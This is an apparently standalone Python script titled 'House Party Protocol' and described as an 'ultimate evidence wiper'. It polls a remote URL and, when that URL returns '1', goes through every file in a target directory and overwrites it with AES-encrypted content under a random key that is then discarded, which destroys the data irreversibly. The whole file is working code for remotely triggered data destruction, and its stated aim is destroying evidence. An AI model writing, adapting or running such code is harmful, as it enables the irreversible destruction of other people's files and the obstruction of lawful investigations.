#!/usr/bin/python3

from Crypto import Random
from Crypto.Cipher import AES
import urllib.request
import random
import string
import glob
import os
import argparse
from time import sleep

print('''

 _    _                        _____           _         
| |  | |                      |  __ \         | |        
| |__| | ___  _   _ ___  ___  | |__) |_ _ _ __| |_ _   _ 
|  __  |/ _ \| | | / __|/ _ \ |  ___/ _` | '__| __| | | |
| |  | | (_) | |_| \__ \  __/ | |  | (_| | |  | |_| |_| |
|_|  |_|\___/ \__,_|___/\___| |_|   \__,_|_|   \__|\__, |
                                                    __/ |
                                                   |___/ 
       _____           _                  _ 
      |  __ \         | |                | |
      | |__) | __ ___ | |_ ___   ___ ___ | |
      |  ___/ '__/ _ \| __/ _ \ / __/ _ \| |
      | |   | | | (_) | || (_) | (_| (_) | |
      |_|   |_|  \___/ \__\___/ \___\___/|_|

          an ultimate evidence wiper v1.0
      Written by Utku Sen(Jani) / utkusen.com
''')

finish_control = 0 #to finish while loop inside the 'listener' function


def pad(s):
    return s + b"\0" * (AES.block_size - len(s) % AES.block_size)

def encrypt(message, key, key_size=256):
    message = pad(message)
    iv = Random.new().read(AES.block_size)
    cipher = AES.new(key, AES.MODE_CBC, iv)
    return iv + cipher.encrypt(message)

def encrypt_file(file_name, key):
    with open(file_name, 'rb') as fo:
        plaintext = fo.read()
    enc = encrypt(plaintext, key)
    with open(file_name, 'wb') as fo:
        fo.write(enc)


#creates key with n lenght for 'encrypt_file' function
def create_key(n):        
    key = ''.join([random.choice(string.ascii_letters + string.digits) for n in range(n)])
    return key

#calls encrypt_file function for files in location, subdirectories of location
def destroy_directory(location):
    for root, _, files in os.walk(location):
        for fil in files:
            fname = os.path.join(root, fil)
            encrypt_file(fname,create_key(32))
            print(fname + " is encrypted")
    print("---Action completed!---")
    finish_control = 1 #listener function ends
    global finish_control #making it global, it's now available for listener function

#checks the given url, if it has string '1' it calls destroy_directory function in order to start the action
def check_url(url):
    print ("Status: Listening")
    response = urllib.request.urlopen(url)
    data = response.read()
    text = data.decode('utf-8')
    if text == '1':
        print("--Action Started!--")
        destroy_directory(argv.location)
        
            
#calls check_url function for every 'interval' seconds
def listener(url,interval):
    while True:
        if finish_control == 1: #progress finishes
            break
        check_url(url)
        sleep(interval)

        
parser = argparse.ArgumentParser()
parser.add_argument('-d', action='store', dest='location', help='Directory to be encrypt', required=True)
parser.add_argument('-u', action='store', dest='url', help='Url in which the program takes command', required=True)
parser.add_argument('-i', action='store', dest='interval', help='Interval for checking the url', required=True, type=int)
argv = parser.parse_args()

listener(argv.url,argv.interval)
